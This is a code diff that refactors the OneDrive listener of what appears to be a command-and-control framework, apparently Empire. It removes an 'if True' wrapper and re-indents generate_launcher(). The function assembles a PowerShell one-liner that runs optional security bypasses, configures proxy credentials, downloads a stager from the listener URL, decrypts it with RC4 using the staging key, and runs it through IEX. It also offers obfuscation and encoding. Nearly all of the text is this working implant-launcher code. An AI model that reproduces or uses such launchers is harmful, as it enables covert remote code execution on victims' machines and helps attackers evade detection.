@@ -211,100 +211,90 @@ class Listener:
             log.error("listeners/onedrive generate_launcher(): No language specified")
             return None
 
-        # Previously, we had to do a lookup for the listener and check through threads on the instance.
-        # Beginning in 5.0, each instance is unique, so using self should work. This code could probably be simplified
-        # further, but for now keeping as is since 5.0 has enough rewrites as it is.
-        if (
-            True
-        ):  # The true check is just here to keep the indentation consistent with the old code.
-            active_listener = self
-            # extract the set options for this instantiated listener
-            listener_options = active_listener.options
+        active_listener = self
+        # extract the set options for this instantiated listener
+        listener_options = active_listener.options
 
-            launcher_cmd = listener_options["Launcher"]["Value"]
-            staging_key = listener_options["StagingKey"]["Value"]
+        launcher_cmd = listener_options["Launcher"]["Value"]
+        staging_key = listener_options["StagingKey"]["Value"]
 
-            if language.startswith("power"):
-                launcher = ""
-                if safeChecks.lower() == "true":
-                    launcher += "If($PSVersionTable.PSVersion.Major -ge 3){"
+        if language.startswith("power"):
+            launcher = ""
+            if safeChecks.lower() == "true":
+                launcher += "If($PSVersionTable.PSVersion.Major -ge 3){"
 
-                    for bypass in bypasses:
-                        launcher += bypass
-                    launcher += (
-                        "};[System.Net.ServicePointManager]::Expect100Continue=0;"
-                    )
+                for bypass in bypasses:
+                    launcher += bypass
+                launcher += "};[System.Net.ServicePointManager]::Expect100Continue=0;"
 
-                launcher += "$wc=New-Object System.Net.WebClient;"
+            launcher += "$wc=New-Object System.Net.WebClient;"
 
-                if userAgent.lower() == "default":
-                    profile = listener_options["DefaultProfile"]["Value"]
-                    userAgent = profile.split("|")[1]
-                launcher += f"$u='{ userAgent }';"
+            if userAgent.lower() == "default":
+                profile = listener_options["DefaultProfile"]["Value"]
+                userAgent = profile.split("|")[1]
+            launcher += f"$u='{ userAgent }';"
 
-                if userAgent.lower() != "none" or proxy.lower() != "none":
-                    if userAgent.lower() != "none":
-                        launcher += "$wc.Headers.Add('User-Agent',$u);"
+            if userAgent.lower() != "none" or proxy.lower() != "none":
+                if userAgent.lower() != "none":
+                    launcher += "$wc.Headers.Add('User-Agent',$u);"
 
-                    if proxy.lower() != "none":
-                        if proxy.lower() == "default":
-                            launcher += (
-                                "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"
-                            )
-
-                        else:
-                            launcher += "$proxy=New-Object Net.WebProxy;"
-                            launcher += f"$proxy.Address = '{ proxy.lower() }';"
-                            launcher += "$wc.Proxy = $proxy;"
-
-                    if proxyCreds.lower() == "default":
-                        launcher += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"
+                if proxy.lower() != "none":
+                    if proxy.lower() == "default":
+                        launcher += (
+                            "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"
+                        )
 
                     else:
-                        username = proxyCreds.split(":")[0]
-                        password = proxyCreds.split(":")[1]
-                        domain = username.split("\\")[0]
-                        usr = username.split("\\")[1]
-                        launcher += f"$netcred = New-Object System.Net.NetworkCredential('{ usr }', '{ password }', '{ domain }');"
-                        launcher += "$wc.Proxy.Credentials = $netcred;"
+                        launcher += "$proxy=New-Object Net.WebProxy;"
+                        launcher += f"$proxy.Address = '{ proxy.lower() }';"
+                        launcher += "$wc.Proxy = $proxy;"
 
-                    launcher += "$Script:Proxy = $wc.Proxy;"
+                if proxyCreds.lower() == "default":
+                    launcher += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"
 
-                # code to turn the key string into a byte array
-                launcher += (
-                    f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ staging_key }');"
-                )
-
-                # this is the minimized RC4 launcher code from rc4.ps1
-                launcher += listener_util.powershell_rc4()
-
-                launcher += f"$data=$wc.DownloadData('{self.stager_url}');"
-                launcher += "$iv=$data[0..3];$data=$data[4..$data.length];"
-                launcher += "-join[Char[]](& $R $data ($IV+$K))|IEX"
-
-                # Remove comments and make one line
-                launcher = helpers.strip_powershell_comments(launcher)
-                launcher = data_util.ps_convert_to_oneliner(launcher)
-
-                if obfuscate:
-                    launcher = self.mainMenu.obfuscationv2.obfuscate(
-                        launcher,
-                        obfuscation_command=obfuscation_command,
-                    )
-                    launcher = self.mainMenu.obfuscationv2.obfuscate_keywords(launcher)
-
-                if encode and (
-                    (not obfuscate) or ("launcher" not in obfuscation_command.lower())
-                ):
-                    return helpers.powershell_launcher(launcher, launcher_cmd)
                 else:
-                    return launcher
+                    username = proxyCreds.split(":")[0]
+                    password = proxyCreds.split(":")[1]
+                    domain = username.split("\\")[0]
+                    usr = username.split("\\")[1]
+                    launcher += f"$netcred = New-Object System.Net.NetworkCredential('{ usr }', '{ password }', '{ domain }');"
+                    launcher += "$wc.Proxy.Credentials = $netcred;"
 
-            if language.startswith("pyth"):
-                log.error(
-                    "listeners/onedrive generate_launcher(): Python agent not implemented yet"
+                launcher += "$Script:Proxy = $wc.Proxy;"
+
+            # code to turn the key string into a byte array
+            launcher += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ staging_key }');"
+
+            # this is the minimized RC4 launcher code from rc4.ps1
+            launcher += listener_util.powershell_rc4()
+
+            launcher += f"$data=$wc.DownloadData('{self.stager_url}');"
+            launcher += "$iv=$data[0..3];$data=$data[4..$data.length];"
+            launcher += "-join[Char[]](& $R $data ($IV+$K))|IEX"
+
+            # Remove comments and make one line
+            launcher = helpers.strip_powershell_comments(launcher)
+            launcher = data_util.ps_convert_to_oneliner(launcher)
+
+            if obfuscate:
+                launcher = self.mainMenu.obfuscationv2.obfuscate(
+                    launcher,
+                    obfuscation_command=obfuscation_command,
                 )
-                return "Python not implemented yet"
+                launcher = self.mainMenu.obfuscationv2.obfuscate_keywords(launcher)
+
+            if encode and (
+                (not obfuscate) or ("launcher" not in obfuscation_command.lower())
+            ):
+                return helpers.powershell_launcher(launcher, launcher_cmd)
+            else:
+                return launcher
+
+        if language.startswith("pyth"):
+            log.error(
+                "listeners/onedrive generate_launcher(): Python agent not implemented yet"
+            )
+            return "Python not implemented yet"
 
     def generate_stager(
         self,
